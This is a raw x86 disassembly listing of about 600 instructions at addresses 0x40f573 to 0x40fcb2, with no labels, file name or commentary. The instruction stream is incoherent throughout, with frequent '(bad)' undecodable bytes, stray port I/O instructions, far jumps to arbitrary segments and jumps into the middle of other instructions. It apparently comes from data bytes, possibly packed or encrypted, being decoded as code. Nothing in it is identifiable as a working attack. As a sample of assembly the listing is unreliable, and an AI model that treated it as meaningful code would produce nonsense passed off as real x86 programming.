  40f573:	retf   0x5615
  40f576:	push   esi
  40f577:	push   esi
  40f578:	push   0xa5e15ab5
  40f57d:	dec    ebx
  40f57e:	xchg   edi,eax
  40f57f:	sahf   
  40f580:	js     0x40f57b
  40f582:	in     eax,0x97
  40f584:	mov    edi,0x85c2e176
  40f589:	out    0x37,eax
  40f58b:	aaa    
  40f58c:	aaa    
  40f58d:	das    
  40f58e:	mov    eax,ds:0x3ccd63c6
  40f593:	or     al,ch
  40f595:	sar    BYTE PTR [edi+eax*2+0x64],cl
  40f599:	int3   
  40f59a:	sub    BYTE PTR [ebx],dh
  40f59c:	enter  0x2a3,0x59
  40f5a0:	mov    al,0x2f
  40f5a2:	sub    eax,ebx
  40f5a4:	addr16 jle 0x40f5b4
  40f5a7:	push   ebx
  40f5a8:	test   al,0xa0
  40f5aa:	cmp    eax,0xcbcbcb0f
  40f5af:	push   edi
  40f5b0:	xchg   edi,eax
  40f5b1:	xchg   edi,eax
  40f5b2:	xchg   edi,eax
  40f5b3:	das    
  40f5b4:	(bad)  
  40f5b5:	(bad)  
  40f5b6:	outs   dx,DWORD PTR ds:[esi]
  40f5b7:	std    
  40f5b8:	(bad)  
  40f5b9:	push   edi
  40f5ba:	sub    dl,BYTE PTR [ebp-0x54a952b6]
  40f5c0:	aad    0x17
  40f5c2:	pop    ss
  40f5c3:	pop    ss
  40f5c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5c5:	out    0xe6,eax
  40f5c7:	out    0xe6,al
  40f5c9:	imul   DWORD PTR [esi]
  40f5cb:	mov    cs,WORD PTR cs:[ebp-0x42307071]
  40f5d2:	std    
  40f5d3:	ins    DWORD PTR es:[edi],dx
  40f5d4:	outs   dx,DWORD PTR ds:[esi]
  40f5d5:	sti    
  40f5d6:	call   0xc1313312
  40f5db:	je     0x40f596
  40f5dd:	push   esp
  40f5de:	and    dl,BYTE PTR [ecx+0x75cea192]
  40f5e4:	cmp    BYTE PTR [eax],bl
  40f5e6:	or     al,0xb8
  40f5e8:	jp     0x40f5cf
  40f5ea:	or     bh,BYTE PTR [ebp+0x39854f5e]
  40f5f0:	xchg   ecx,esp
  40f5f2:	mov    ?,WORD PTR [esi]
  40f5f4:	add    eax,0xe28270f3
  40f5f9:	mov    ?,WORD PTR [eax-0x227653d1]
  40f5ff:	jge    0x40f64a
  40f601:	pop    ss
  40f602:	sub    eax,0xd99155a8
  40f607:	outs   dx,BYTE PTR ds:[esi]
  40f608:	scas   al,BYTE PTR es:[edi]
  40f609:	fwait
  40f60a:	sbb    DWORD PTR [edi],esi
  40f60c:	into   
  40f60d:	std    
  40f60e:	add    eax,0x1bc35c20
  40f613:	push   0x76
  40f615:	out    0xd5,al
  40f617:	cmc    
  40f618:	dec    ebp
  40f619:	push   esi
  40f61a:	push   esi
  40f61b:	xlat   BYTE PTR ds:[ebx]
  40f61c:	pop    ecx
  40f61d:	ds jge 0x40f5b6
  40f620:	inc    eax
  40f621:	out    0x6a,eax
  40f623:	ins    BYTE PTR es:[edi],dx
  40f624:	xor    al,0xaa
  40f626:	xor    al,0x9b
  40f628:	or     eax,0x250df3be
  40f62d:	stos   BYTE PTR es:[edi],al
  40f62e:	(bad)  
  40f630:	loopne 0x40f639
  40f632:	ds jno 0x40f63c
  40f635:	sahf   
  40f636:	cmp    al,0xc2
  40f638:	dec    di
  40f63a:	jo     0x40f625
  40f63c:	jb     0x40f60a
  40f63e:	jmp    0xb4f8:0x2ea716ea
  40f645:	ss scas eax,DWORD PTR es:[edi]
  40f647:	lock jmp 0xff7a8d7c
  40f64d:	in     al,dx
  40f64e:	inc    ebp
  40f64f:	out    dx,al
  40f650:	pop    esi
  40f651:	in     al,dx
  40f652:	push   ecx
  40f653:	test   eax,0x8ce9d02c
  40f658:	jle    0x40f69c
  40f65a:	jecxz  0x40f696
  40f65c:	ss jbe 0x40f600
  40f65f:	add    ah,BYTE PTR [edx+edi*4]
  40f662:	push   esi
  40f663:	cs xchg edi,eax
  40f665:	inc    ebx
  40f666:	pop    esi
  40f667:	lds    esi,FWORD PTR [esi+0x53]
  40f66a:	sub    al,BYTE PTR [eax+0x4958994]
  40f670:	(bad)  
  40f671:	lods   eax,DWORD PTR ds:[esi]
  40f672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f673:	rol    BYTE PTR [eax-0x2a],1
  40f676:	push   es
  40f677:	loopne 0x40f62f
  40f679:	dec    edx
  40f67a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f67b:	mov    ds:0xa9d1b8f,al
  40f680:	in     al,dx
  40f681:	mov    dh,0xeb
  40f683:	sbb    esi,esi
  40f685:	scas   al,BYTE PTR es:[edi]
  40f686:	ja     0x40f6d4
  40f688:	sar    DWORD PTR [edx+0x585d5d09],1
  40f68e:	pop    eax
  40f68f:	pusha  
  40f690:	jbe    0x40f708
  40f692:	ss xchg ebx,eax
  40f694:	fwait
  40f695:	int    0xec
  40f697:	mov    edi,0x9712e974
  40f69c:	das    
  40f69d:	pop    edi
  40f69e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f69f:	xlat   BYTE PTR ds:[ebx]
  40f6a0:	jmp    0x40f673
  40f6a2:	push   0xaeebb834
  40f6a7:	mov    ebx,0xcd9d9d98
  40f6ac:	fs push cs
  40f6ae:	mov    fs,WORD PTR [edx-0x31188c78]
  40f6b4:	jno    0x40f6aa
  40f6b6:	call   0x37782d0c
  40f6bb:	or     DWORD PTR [ebx-0xb],eax
  40f6be:	in     eax,dx
  40f6bf:	ret    0x6c30
  40f6c2:	popf   
  40f6c3:	aas    
  40f6c4:	jg     0x40f6c4
  40f6c6:	fcomp  DWORD PTR [ecx-0x156198cd]
  40f6cc:	je     0x40f708
  40f6ce:	sub    ebp,DWORD PTR [eax]
  40f6d0:	and    dh,BYTE PTR [ebx]
  40f6d2:	test   eax,0xe6510c74
  40f6d7:	jne    0x40f6d7
  40f6d9:	fnsave [esp+edx*8+0x168a3d59]
  40f6e0:	mov    cl,BYTE PTR [eax-0x32240c4]
  40f6e6:	out    0xd5,al
  40f6e8:	pop    es
  40f6e9:	adc    DWORD PTR [edx],0xffffffa2
  40f6ec:	shl    DWORD PTR [eax-0x30],0x1f
  40f6f0:	or     al,0x6
  40f6f2:	fistp  DWORD PTR [ebx-0x38946465]
  40f6f8:	mov    ds,WORD PTR ds:0xef77b73b
  40f6fe:	fdivrp st(1),st
  40f700:	cmp    ebp,edi
  40f702:	mov    esp,0xab5ea973
  40f707:	mov    ebp,0x9fa7a9f3
  40f70c:	sahf   
  40f70d:	outs   dx,BYTE PTR ds:[esi]
  40f70e:	call   0x173bfa0f
  40f713:	pop    ss
  40f714:	cdq    
  40f715:	popf   
  40f716:	popf   
  40f717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f718:	fldcw  WORD PTR [edx+esi*2-0x31]
  40f71c:	mov    ebp,0x849322f7
  40f721:	mov    ch,0xd5
  40f723:	push   ebp
  40f724:	mov    dh,0xb6
  40f726:	mov    dh,0x58
  40f728:	pop    ebx
  40f729:	pop    ebp
  40f72a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f72b:	(bad)  [edx+0x11]
  40f72e:	inc    ebp
  40f72f:	xchg   ecx,eax
  40f730:	dec    edx
  40f731:	jle    0x40f75c
  40f733:	and    eax,0x59a42e5e
  40f738:	test   al,0x4e
  40f73a:	iret   
  40f73b:	adc    BYTE PTR [ebp+0x6ff966fd],dh
  40f741:	ins    DWORD PTR es:[edi],dx
  40f742:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f743:	xchg   DWORD PTR [ecx+0x2],eax
  40f746:	mov    ecx,0x9191a7e0
  40f74b:	xchg   ecx,eax
  40f74c:	arpl   WORD PTR [esi+ebp*2],di
  40f74f:	pop    es
  40f750:	gs inc esp
  40f752:	mov    fs,WORD PTR [edi+0x4b9510b2]
  40f758:	and    eax,0x25252015
  40f75d:	and    ecx,0xffffff90
  40f760:	(bad)  
  40f761:	pusha  
  40f762:	sar    dl,0xfa
  40f765:	xchg   esi,eax
  40f766:	cmp    eax,0x280e5caf
  40f76b:	push   ebp
  40f76c:	retf   0xaad4
  40f76f:	gs out dx,al
  40f771:	cwde   
  40f772:	fwait
  40f773:	loopne 0x40f736
  40f775:	xlat   BYTE PTR ds:[ebx]
  40f776:	dec    esp
  40f777:	xor    DWORD PTR [ecx],esi
  40f779:	faddp  st(0),st
  40f77b:	or     esi,esi
  40f77d:	repnz leave 
  40f77f:	enter  0xd3a3,0xbe
  40f783:	xor    DWORD PTR [ebp-0x527ce113],0xffffffd3
  40f78a:	les    esi,FWORD PTR [ecx-0x7e]
  40f78d:	out    dx,eax
  40f78e:	(bad)  
  40f78f:	mov    eax,es:0x7e80820d
  40f795:	mov    edi,0x7c00c85f
  40f79a:	(bad)  
  40f79c:	cli    
  40f79d:	rol    BYTE PTR [edi+0x1aaaf43e],1
  40f7a3:	les    esi,FWORD PTR [esi-0x1b]
  40f7a6:	push   es
  40f7a7:	je     0x40f826
  40f7a9:	mov    eax,ds:0x75c7e826
  40f7ae:	add    esp,DWORD PTR [esi-0x1]
  40f7b1:	aam    0x36
  40f7b3:	cmc    
  40f7b4:	in     eax,dx
  40f7b5:	and    al,0x63
  40f7b7:	arpl   WORD PTR [ebx-0x6],sp
  40f7ba:	mov    esp,0xbca0366c
  40f7bf:	gs jle 0x40f7e9
  40f7c2:	xlat   BYTE PTR ds:[ebx]
  40f7c3:	pop    esp
  40f7c4:	mov    esi,0xee10a915
  40f7c9:	mov    edx,0x2a5bc4cd
  40f7ce:	mov    cl,0x67
  40f7d0:	iret   
  40f7d1:	push   ds
  40f7d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7d5:	imul   esi,DWORD PTR [edx+ebx*1],0x71c66b99
  40f7dc:	ins    BYTE PTR es:[edi],dx
  40f7dd:	sub    eax,0x8b56adf5
  40f7e2:	jp     0x40f7a1
  40f7e4:	into   
  40f7e5:	sbb    eax,0xc2c1dc77
  40f7ea:	ret    0xf502
  40f7ed:	jp     0x40f7cc
  40f7ef:	fisub  WORD PTR [ebx-0x60]
  40f7f2:	mov    eax,ds:0x2793c9f0
  40f7f7:	mov    ecx,0x4e92e974
  40f7fc:	mov    dl,BYTE PTR [edx-0x56ad4ece]
  40f802:	xor    al,0xfd
  40f804:	xchg   esi,eax
  40f805:	mov    bh,0xbc
  40f807:	in     eax,0x7
  40f809:	(bad)  
  40f80b:	fdivrp st(7),st
  40f80d:	jle    0x40f7f6
  40f80f:	cdq    
  40f810:	xor    esp,DWORD PTR [edi+0x3e]
  40f813:	call   esp
  40f815:	push   ebx
  40f816:	dec    edi
  40f817:	cmp    eax,0xf1f8fc7a
  40f81c:	push   ebx
  40f81d:	fcmovu st,st(7)
  40f81f:	pop    edi
  40f820:	bound  edx,QWORD PTR [eax+edi*8-0x47]
  40f824:	retf   
  40f825:	xlat   BYTE PTR ds:[ebx]
  40f826:	in     eax,dx
  40f827:	jp     0x40f810
  40f829:	fsub   DWORD PTR [edx]
  40f82b:	js     0x40f7c1
  40f82d:	fistp  WORD PTR [edi+0x674ae1e6]
  40f833:	adc    DWORD PTR [ebx-0x1bb0bef8],edi
  40f839:	daa    
  40f83a:	add    al,0x12
  40f83c:	fcomip st,st(7)
  40f83e:	retf   
  40f83f:	or     ecx,DWORD PTR [ebx]
  40f841:	or     ecx,DWORD PTR [ebx]
  40f843:	neg    ebp
  40f845:	ja     0x40f826
  40f847:	loope  0x40f83a
  40f849:	icebp  
  40f84a:	icebp  
  40f84b:	cmp    ebp,esi
  40f84d:	mov    edi,0x4bc3feff
  40f852:	dec    ebx
  40f853:	dec    ebx
  40f854:	fist   WORD PTR [edi+ebp*4-0x29]
  40f858:	daa    
  40f859:	imul   esi,DWORD PTR [ebp+0x638e355a],0x2e
  40f860:	pop    esp
  40f861:	mov    eax,0x2793c9c0
  40f866:	pop    ecx
  40f867:	pop    ecx
  40f868:	pop    ecx
  40f869:	loope  0x40f843
  40f86b:	or     ebp,DWORD PTR [edi]
  40f86d:	push   eax
  40f86e:	sub    dl,BYTE PTR [ebp-0x13142858]
  40f874:	(bad)  [edi+0x59d9d98f]
  40f87a:	data16 cmp WORD PTR [bx+si-0x39],di
  40f880:	sbb    eax,0x8e475dc
  40f885:	add    ch,al
  40f887:	cmc    
  40f888:	sti    
  40f889:	pop    esp
  40f88a:	pop    ecx
  40f88b:	pop    ecx
  40f88c:	mov    eax,ds:0xb1b16add
  40f891:	mov    esi,0x3a0a6cae
  40f896:	dec    esi
  40f897:	inc    ecx
  40f898:	mov    al,ds:0x6c6d77f5
  40f89d:	hlt    
  40f89e:	repnz test bh,ch
  40f8a1:	stos   BYTE PTR es:[edi],al
  40f8a2:	imul   ecx,esi,0x4b
  40f8a5:	gs or  bl,bl
  40f8a8:	gs (bad) 
  40f8aa:	es cli 
  40f8ac:	shl    BYTE PTR [ebp+0x38eb980f],1
  40f8b2:	jno    0x40f8c4
  40f8b4:	nop
  40f8b5:	mov    edx,0xb7b7b71d
  40f8ba:	sbb    DWORD PTR [esi],ecx
  40f8bc:	xchg   DWORD PTR [ebx+ecx*8+0x59d51b65],edx
  40f8c3:	sub    dl,BYTE PTR [ebp-0x51fb66d8]
  40f8c9:	call   0x3110:0x60c02569
  40f8d0:	sbb    BYTE PTR [esp+ebp*4+0x6f],al
  40f8d4:	mov    ah,0x39
  40f8d6:	jno    0x40f8ca
  40f8d8:	mov    esp,0x3531ec4d
  40f8dd:	cmp    esi,eax
  40f8df:	clc    
  40f8e0:	les    eax,FWORD PTR [ebx+edi*2]
  40f8e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8e5:	cmp    DWORD PTR [ebp+0x3f6b7121],esi
  40f8eb:	out    0x63,al
  40f8ed:	push   ebx
  40f8ee:	jp     0x40f8ad
  40f8f0:	fimul  WORD PTR [eax-0x56ad4ff5]
  40f8f6:	lock aam 0x53
  40f8f9:	dec    edi
  40f8fa:	mov    ch,0x8b
  40f8fc:	aas    
  40f8fd:	stc    
  40f8fe:	in     eax,dx
  40f8ff:	imul   edi,DWORD PTR [ebx-0x4bbcffbf],0x6f
  40f906:	aas    
  40f907:	or     al,0x87
  40f909:	call   0x710c:0x10876390
  40f910:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f911:	arpl   WORD PTR [ebx-0x1b],bx
  40f914:	inc    ecx
  40f915:	iret   
  40f916:	(bad)  
  40f917:	jmp    0x2dbd6237
  40f91c:	mov    bh,0x9e
  40f91e:	stos   DWORD PTR es:[edi],eax
  40f91f:	inc    esi
  40f920:	in     al,dx
  40f921:	je     0x40f96f
  40f923:	(bad)  
  40f924:	js     0x40f8d9
  40f926:	outs   dx,BYTE PTR ds:[esi]
  40f927:	hlt    
  40f928:	sti    
  40f929:	pop    edx
  40f92a:	lods   eax,DWORD PTR ds:[esi]
  40f92b:	inc    esi
  40f92c:	mov    bl,0xd9
  40f92e:	fs iret 
  40f930:	sahf   
  40f931:	cmp    eax,0xb9b5e4b6
  40f936:	jg     0x40f8f7
  40f938:	fbld   TBYTE PTR [edi-0x4d4e952b]
  40f93e:	mov    dl,0x42
  40f940:	sbb    BYTE PTR [esi+0xe75ebd4],al
  40f946:	pop    ds
  40f947:	ds int3 
  40f949:	(bad)  
  40f94b:	pushf  
  40f94c:	mov    ch,0xea
  40f94e:	sbb    edi,ebp
  40f950:	jle    0x40f9c5
  40f952:	jae    0x40f8e7
  40f954:	adc    esp,DWORD PTR [edi]
  40f956:	dec    esi
  40f957:	jo     0x40f93a
  40f959:	ret    0x8605
  40f95c:	inc    ebx
  40f95d:	cmc    
  40f95e:	fiadd  WORD PTR [esi]
  40f960:	cmc    
  40f961:	sbb    bh,bh
  40f963:	jp     0x40f975
  40f965:	add    al,0x2c
  40f967:	cs cs jb 0x40f94f
  40f96b:	enter  0xa991,0xb7
  40f96f:	mov    edi,0xf5dfedfd
  40f974:	ror    DWORD PTR [edi],0x7e
  40f977:	lock add ebp,DWORD PTR [edi]
  40f97a:	mov    esi,0x9f73e2f8
  40f97f:	(bad)  
  40f980:	hlt    
  40f981:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f982:	push   eax
  40f984:	cdq    
  40f985:	addr16 sahf 
  40f987:	jns    0x40f9b3
  40f989:	push   esp
  40f98a:	push   eax
  40f98b:	sar    eax,0x90
  40f98e:	repnz pushf 
  40f990:	mov    dl,0x88
  40f992:	adc    DWORD PTR [eax-0x158511fe],edi
  40f998:	sub    DWORD PTR [ecx+0x5e],0xe8973ec1
  40f99f:	xchg   DWORD PTR [ebp+0x313aa952],esp
  40f9a5:	xor    DWORD PTR [ecx-0x42211099],esi
  40f9ab:	or     ecx,DWORD PTR [ebx+0x4b]
  40f9ae:	dec    ebx
  40f9af:	sti    
  40f9b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9b3:	out    0x5e,eax
  40f9b5:	sti    
  40f9b6:	fcmovbe st,st(7)
  40f9b8:	push   ds
  40f9b9:	pop    edx
  40f9ba:	pop    edx
  40f9bb:	pop    edx
  40f9bc:	jp     0x40f99b
  40f9be:	clc    
  40f9bf:	clc    
  40f9c0:	clc    
  40f9c1:	test   BYTE PTR [ebx-0x1a523d4c],bl
  40f9c7:	mov    eax,0xad40b0b0
  40f9cc:	push   esi
  40f9cd:	jecxz  0x40f9ab
  40f9cf:	mov    ecx,0x6adbb473
  40f9d4:	int3   
  40f9d5:	jbe    0x40f992
  40f9d7:	pop    ebp
  40f9d8:	mov    ds,WORD PTR [edi]
  40f9da:	aas    
  40f9db:	into   
  40f9dc:	mov    ebp,DWORD PTR [edi]
  40f9de:	mov    esi,0xfcc21968
  40f9e3:	cld    
  40f9e4:	mov    esp,0x68d1179a
  40f9e9:	xor    BYTE PTR [ecx],dh
  40f9eb:	ds into 
  40f9ed:	mov    esi,0x7839fbfd
  40f9f2:	(bad)  
  40f9f3:	sbb    eax,0x6ed04278
  40f9f8:	mov    ch,0xe8
  40f9fa:	je     0x40fa36
  40f9fc:	ss das 
  40f9fe:	shl    DWORD PTR [eax+0x30],0xb0
  40fa02:	dec    esp
  40fa03:	and    esi,edx
  40fa05:	div    ebx
  40fa07:	sbb    DWORD PTR [ebp+0x83996f2],eax
  40fa0d:	xchg   ecx,eax
  40fa0e:	dec    edx
  40fa0f:	icebp  
  40fa10:	pushf  
  40fa11:	call   0x52f3:0xc40cf220
  40fa18:	data16 loopne 0x40f9bb
  40fa1b:	or     ebp,DWORD PTR [ecx-0x1bcf3c29]
  40fa21:	loopne 0x40f9a4
  40fa23:	add    edx,DWORD PTR [ebx+ebp*1-0x512245eb]
  40fa2a:	jb     0x40f9b7
  40fa2c:	or     DWORD PTR es:[ebp-0x5c996892],ebx
  40fa33:	xchg   ecx,eax
  40fa34:	xor    cl,BYTE PTR [edi+eax*4]
  40fa37:	mov    ch,bl
  40fa39:	cmp    esp,edi
  40fa3b:	push   ecx
  40fa3c:	adc    al,0x71
  40fa3e:	in     eax,0xea
  40fa40:	cmp    dl,BYTE PTR [edi-0x7df6a9a9]
  40fa46:	gs cmp eax,0xb191bc0e
  40fa4c:	imul   ebp,esp,0x5f053b24
  40fa52:	lds    esi,FWORD PTR [ecx+0x7c]
  40fa55:	fld    TBYTE PTR [ebx+0x6edbe701]
  40fa5b:	adc    BYTE PTR [eax+0xf],al
  40fa5e:	int3   
  40fa5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa60:	xchg   BYTE PTR [esi],cl
  40fa62:	push   edx
  40fa63:	es inc esp
  40fa65:	push   ecx
  40fa66:	push   0xfffffff4
  40fa68:	push   ebx
  40fa69:	test   BYTE PTR [ecx+0x22],ah
  40fa6c:	in     al,0xd2
  40fa6e:	jl     0x40fade
  40fa70:	push   edx
  40fa71:	mov    ebx,0xbd448c4c
  40fa76:	adc    eax,0x6197406e
  40fa7b:	dec    esp
  40fa7c:	dec    esp
  40fa7d:	dec    esp
  40fa7e:	xor    BYTE PTR [ebx],dh
  40fa80:	xor    eax,DWORD PTR [ebx-0x53]
  40fa83:	push   esi
  40fa84:	mov    bl,0x1c
  40fa86:	xlat   BYTE PTR ds:[ebx]
  40fa87:	and    BYTE PTR [esi+0x5675f5f5],cl
  40fa8d:	push   esi
  40fa8e:	push   esi
  40fa8f:	push   0xbef8dbb7
  40fa94:	iret   
  40fa95:	(bad)  
  40fa97:	sbb    al,0x7b
  40fa99:	imul   esi
  40fa9b:	mov    ch,0xf3
  40fa9d:	(bad)  
  40fa9f:	(bad)  
  40faa0:	pop    ebx
  40faa1:	pop    ebx
  40faa2:	pop    ebx
  40faa3:	jecxz  0x40fa2a
  40faa5:	pop    ss
  40faa6:	pop    esi
  40faa7:	loopne 0x40fa8b
  40faa9:	lds    ecx,FWORD PTR [ebx-0x582040c]
  40faaf:	std    
  40fab0:	mov    esi,0x60618ebd
  40fab5:	cs icebp 
  40fab7:	fbstp  TBYTE PTR [ebp-0x29]
  40faba:	pop    ebp
  40fabb:	sbb    al,0x3a
  40fabd:	je     0x40fa47
  40fabf:	mov    DWORD PTR [ecx-0x3d95e5f7],ecx
  40fac5:	dec    edi
  40fac6:	xor    BYTE PTR [ebx],bh
  40fac8:	cmp    edi,ebx
  40faca:	cli    
  40facb:	xlat   BYTE PTR ds:[ebx]
  40facc:	mov    ebp,0x7faf75ee
  40fad1:	jmp    0x3fb3:0xf6bea7a9
  40fad8:	sti    
  40fad9:	mov    bl,0xff
  40fadb:	jbe    0x40fb42
  40fadd:	gs in  eax,0xa
  40fae0:	retf   0x6f5a
  40fae3:	es push eax
  40fae5:	and    al,0xce
  40fae7:	xor    ah,BYTE PTR [ecx+ebx*1+0x41]
  40faeb:	jbe    0x40fa83
  40faed:	dec    ebx
  40faee:	push   ss
  40faef:	(bad)  
  40faf0:	out    0xd1,eax
  40faf2:	outs   dx,DWORD PTR ds:[esi]
  40faf3:	sar    DWORD PTR [edx],1
  40faf5:	cli    
  40faf6:	fiadd  DWORD PTR [ebx]
  40faf8:	inc    eax
  40faf9:	int3   
  40fafa:	iret   
  40fafb:	iret   
  40fafc:	iret   
  40fafd:	mov    esp,0x7b6f6ded
  40fb02:	jmp    0x40fa9f
  40fb04:	(bad)  
  40fb06:	out    0x37,al
  40fb08:	iret   
  40fb09:	int3   
  40fb0a:	int3   
  40fb0b:	fcomp  QWORD PTR [ebp+0x2e]
  40fb0e:	xchg   edi,eax
  40fb0f:	imul   edx,ebp,0x6a
  40fb12:	aad    0x13
  40fb14:	inc    edx
  40fb15:	pop    eax
  40fb16:	sub    bh,0x76
  40fb19:	inc    edi
  40fb1a:	repz fstp DWORD PTR [ebx-0x5271c721]
  40fb21:	pop    edx
  40fb22:	je     0x40fb1a
  40fb24:	in     al,dx
  40fb25:	pop    ecx
  40fb26:	sbb    edx,eax
  40fb28:	in     al,0x66
  40fb2a:	mov    ecx,0x9cbb76ed
  40fb2f:	cmp    BYTE PTR [ecx-0x3e],dh
  40fb32:	xor    ah,BYTE PTR [eax-0x2d]
  40fb35:	inc    edi
  40fb36:	inc    ecx
  40fb37:	adc    BYTE PTR [eax],dh
  40fb39:	xor    eax,0xa5bec535
  40fb3e:	and    eax,0xb34f4cf6
  40fb43:	je     0x40fb35
  40fb45:	and    ch,cl
  40fb47:	inc    esi
  40fb48:	ret    
  40fb49:	or     al,BYTE PTR [ecx-0x5344892]
  40fb4f:	ficomp DWORD PTR [edx]
  40fb51:	std    
  40fb52:	pop    esi
  40fb53:	(bad)  
  40fb54:	jbe    0x40fb11
  40fb56:	dec    ebp
  40fb57:	dec    edi
  40fb58:	pop    es
  40fb59:	int3   
  40fb5a:	and    al,0x86
  40fb5c:	leave  
  40fb5d:	or     al,BYTE PTR [ecx+0x671d90d4]
  40fb63:	push   ds
  40fb64:	mov    ebp,0xdea0d71
  40fb69:	jmp    0xd46:0x45aa39db
  40fb70:	aam    0xc
  40fb72:	shl    DWORD PTR [ebx],0x45
  40fb75:	mov    al,ds:0xf4f818a0
  40fb7a:	hlt    
  40fb7b:	xor    al,0x41
  40fb7d:	test   eax,0xeac71244
  40fb82:	stc    
  40fb83:	jne    0x40fb8c
  40fb85:	mov    edx,0x6122a536
  40fb8a:	in     al,0x4e
  40fb8c:	outs   dx,DWORD PTR ds:[esi]
  40fb8d:	ja     0x40fbcc
  40fb8f:	dec    ebp
  40fb90:	stc    
  40fb91:	arpl   WORD PTR ds:0xe9d3a3cf,di
  40fb97:	mov    WORD PTR [edi+ebx*1-0x5454fefc],ds
  40fb9e:	stos   DWORD PTR es:[edi],eax
  40fb9f:	imul   edi,DWORD PTR [edx+ecx*8+0x3a6a6ed],0x27
  40fba7:	mov    DWORD PTR [ecx+0x5e391fe],edx
  40fbad:	push   eax
  40fbae:	arpl   dx,bx
  40fbb0:	sbb    BYTE PTR [ecx+eax*2],al
  40fbb3:	jge    0x40fbc0
  40fbb5:	iret   
  40fbb6:	repz xchg ecx,eax
  40fbb8:	xor    cl,cl
  40fbba:	or     al,0x96
  40fbbc:	sbb    ecx,ecx
  40fbbe:	add    edx,DWORD PTR [eax-0x7b121e89]
  40fbc4:	or     ah,bl
  40fbc6:	loopne 0x40fb65
  40fbc8:	jmp    0x276765b6
  40fbcd:	daa    
  40fbce:	inc    edi
  40fbcf:	repnz mov cl,0x77
  40fbd2:	cmp    bl,BYTE PTR ds:0x59575756
  40fbd8:	pop    edi
  40fbd9:	pop    edi
  40fbda:	inc    edi
  40fbdb:	or     BYTE PTR [ecx+0x7d],ah
  40fbde:	clc    
  40fbdf:	xchg   ebx,eax
  40fbe0:	xchg   ebx,eax
  40fbe1:	xchg   ebx,eax
  40fbe2:	cli    
  40fbe3:	cmp    DWORD PTR [ebp-0x42],esi
  40fbe6:	(bad)  
  40fbe7:	lods   eax,DWORD PTR ds:[esi]
  40fbe8:	sub    eax,0xcd3e9f4e
  40fbed:	jmp    0x452ea3c5
  40fbf2:	sahf   
  40fbf3:	xchg   ebp,eax
  40fbf4:	xchg   ebp,eax
  40fbf5:	xchg   ebp,eax
  40fbf6:	mov    ds:0xfd1e8f47,eax
  40fbfb:	and    ebx,edi
  40fbfd:	test   edi,0xeee6e6e7
  40fc03:	fidiv  WORD PTR [edi-0x566e2091]
  40fc09:	test   eax,0xa952c5a9
  40fc0e:	and    al,0xc2
  40fc10:	xor    BYTE PTR [esi+esi*2+0x76],ah
  40fc14:	xchg   esi,eax
  40fc15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc17:	and    eax,0xca6ad1d
  40fc1c:	mov    edi,ebp
  40fc1e:	jle    0x40fc7f
  40fc20:	dec    ecx
  40fc21:	xchg   esi,eax
  40fc22:	xor    ah,ah
  40fc24:	lea    ebp,[edi+0x7c]
  40fc27:	jecxz  0x40fc44
  40fc29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc2c:	dec    cl
  40fc2e:	dec    edi
  40fc2f:	push   esp
  40fc31:	dec    edi
  40fc32:	inc    esp
  40fc34:	cdq    
  40fc35:	xor    esp,DWORD PTR [edi+0x4e]
  40fc38:	mov    ds:0xe1818090,al
  40fc3d:	outs   dx,BYTE PTR ds:[esi]
  40fc3e:	int    0x2f
  40fc40:	mov    bh,0xb9
  40fc42:	test   dh,ch
  40fc44:	cmp    DWORD PTR [edi+0x321cca30],edi
  40fc4a:	frstor [edi-0x2857c651]
  40fc50:	jmp    0x40fcb5
  40fc52:	(bad)  
  40fc54:	cld    
  40fc55:	lock mov ebx,0x37c6f8de
  40fc5b:	mov    esi,0xefbbeee1
  40fc60:	jle    0x40fcd2
  40fc62:	jb     0x40fcd6
  40fc64:	jb     0x40fc38
  40fc66:	xor    DWORD PTR fs:[edx],esi
  40fc69:	test   BYTE PTR [edi-0x1c],dl
  40fc6c:	sbb    eax,0xddcdfb71
  40fc71:	outs   dx,DWORD PTR ds:[esi]
  40fc72:	pop    esp
  40fc73:	cmp    bl,0xf7
  40fc76:	out    dx,eax
  40fc77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc78:	push   esp
  40fc79:	sub    dh,BYTE PTR [ecx+0x18e1b1b1]
  40fc7f:	jp     0x40fce6
  40fc81:	xchg   BYTE PTR [ecx],ah
  40fc83:	mov    eax,0xc71c562a
  40fc88:	pushf  
  40fc89:	aas    
  40fc8a:	jg     0x40fc2a
  40fc8c:	in     eax,0xe5
  40fc8e:	cmp    eax,DWORD PTR gs:[ebp+0xccccf78]
  40fc95:	mov    bl,0x33
  40fc97:	xor    ebp,esp
  40fc99:	fnstenv [ebx+0x585f987]
  40fc9f:	neg    BYTE PTR [edi]
  40fca1:	cmp    BYTE PTR [eax-0x31],ah
  40fca4:	in     eax,dx
  40fca5:	cmc    
  40fca6:	jp     0x40fcd1
  40fca8:	pop    edx
  40fca9:	call   0xbbb5e624
  40fcae:	sub    ah,BYTE PTR [ebx]
  40fcb0:	xchg   ebx,eax
  40fcb1:	(bad)  
  40fcb2:	(bad)  
